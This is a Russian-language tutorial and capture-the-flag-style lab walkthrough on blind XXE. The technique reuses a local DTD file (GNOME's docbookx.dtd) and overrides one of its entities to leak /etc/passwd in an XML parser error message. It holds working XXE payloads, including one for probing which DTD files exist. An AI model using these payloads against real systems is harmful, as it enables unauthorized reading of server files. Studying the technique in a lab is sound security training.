Использование слепого XXE путем повторного использования локального DTD
Предыдущая техника отлично работает с внешним DTD, но она обычно не работает с внутренним DTD, который полностью указан в DOCTYPEэлементе. Это связано с тем, что техника подразумевает использование XML-параметрической сущности в определении другой параметрической сущности. Согласно спецификации XML, это разрешено во внешних DTD, но не во внутренних DTD. (Некоторые парсеры могут это допускать, но многие — нет.)

А как насчет слепых уязвимостей XXE, когда блокируются внеполосные взаимодействия? Вы не можете извлечь данные через внеполосное соединение, и вы не можете загрузить внешний DTD с удаленного сервера.

В этой ситуации все еще возможно вызвать сообщения об ошибках, содержащие конфиденциальные данные, из-за лазейки в спецификации языка XML. Если DTD документа использует гибрид внутренних и внешних деклараций DTD, то внутренний DTD может переопределять сущности, объявленные во внешнем DTD. Когда это происходит, ограничение на использование сущности параметра XML в определении другой сущности параметра ослабевает.

Это означает, что злоумышленник может использовать основанную на ошибках технику XXE из внутреннего DTD, при условии, что сущность параметра XML, которую он использует, переопределяет сущность, объявленную во внешнем DTD. Конечно, если внеполосные соединения заблокированы, то внешняя DTD не может быть загружена из удаленного местоположения. Вместо этого это должен быть внешний файл DTD, который является локальным для сервера приложений. По сути, атака заключается в вызове файла DTD, который случайно существует в локальной файловой системе, и повторном использовании его для переопределения существующей сущности таким образом, что это вызывает ошибку синтаксического анализа, содержащую конфиденциальные данные. Эта техника была впервые применена Арсением Шароглазовым и заняла 7-е место в наших 10 лучших методах веб-хакинга 2018 года .

Например, предположим, что в файловой системе сервера по адресу есть файл DTD /usr/local/app/schema.dtd, и этот файл DTD определяет сущность с именем custom_entity. Злоумышленник может вызвать сообщение об ошибке анализа XML, содержащее содержимое файла /etc/passwd, отправив гибридный DTD, например, следующий:

<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
Данный DTD выполняет следующие шаги:

Определяет параметрическую сущность XML с именем local_dtd, содержащую содержимое внешнего файла DTD, существующего в файловой системе сервера.
Переопределяет параметр XML-сущности, называемый custom_entity, который уже определен во внешнем файле DTD. Сущность переопределяется как содержащая эксплойт XXE на основе ошибок , который уже был описан, для запуска сообщения об ошибке, содержащего содержимое файла /etc/passwd.
Использует local_dtdсущность, так что внешний DTD интерпретируется, включая переопределенное значение сущности custom_entity. Это приводит к желаемому сообщению об ошибке.
Поиск существующего файла DTD для повторного использования
Поскольку эта атака XXE подразумевает повторное использование существующего DTD в файловой системе сервера, ключевым требованием является поиск подходящего файла. Это на самом деле довольно просто. Поскольку приложение возвращает любые сообщения об ошибках, выдаваемые XML-анализатором, вы можете легко перечислить локальные файлы DTD, просто попытавшись загрузить их из внутреннего DTD.

Например, системы Linux, использующие среду рабочего стола GNOME, часто имеют файл DTD по адресу /usr/share/yelp/dtd/docbookx.dtd. Вы можете проверить, присутствует ли этот файл, отправив следующую полезную нагрузку XXE, которая вызовет ошибку, если файл отсутствует:

<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
После того, как вы протестировали список общих файлов DTD, чтобы найти файл, который присутствует, вам нужно получить копию файла и просмотреть ее, чтобы найти сущность, которую вы можете переопределить. Поскольку многие общие системы, которые включают файлы DTD, имеют открытый исходный код, вы обычно можете быстро получить копию файлов с помощью поиска в Интернете.

---

В этой лабораторной работе есть функция «Проверка запасов», которая анализирует входные данные XML, но не отображает результат.

Для решения лабораторной работы вызовите сообщение об ошибке, содержащее содержимое файла /etc/passwd.

Вам необходимо будет сослаться на существующий файл DTD на сервере и переопределить сущность из него.

Подсказка:
Системы, использующие среду рабочего стола GNOME, часто имеют DTD, /usr/share/yelp/dtd/docbookx.dtdсодержащий сущность, называемуюISOamso.

---

1. Нас встречает список продуктов, переходим на любой из них:

![image](https://github.com/user-attachments/assets/420f18e2-6900-4413-81f2-7cc5c6103444)

---

2. Внизу страницы есть кнопка "Проверить наличие на складе" включает Burp прокси и нажимаем:

![image](https://github.com/user-attachments/assets/c12710e3-0520-47a9-b507-1bb41849a7df)

---

3. Заходим в Proxy -> HTTP History выбираем POST запрос к /product/stock и отправляем в Repeater: 

![image](https://github.com/user-attachments/assets/f2febc3e-4ab7-441e-8fb3-04990746f99f)

---

4. Вставьте следующее определение внешней сущности между декларацией XML и stockCheck элементом:
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>

![image](https://github.com/user-attachments/assets/87784678-071c-4e1f-a766-b4add7e516cd)

---

5. Получаем вывод /etc/passwd: ![image](https://github.com/user-attachments/assets/e6f9df34-6e44-46ea-81f9-16d3e6848ab3)
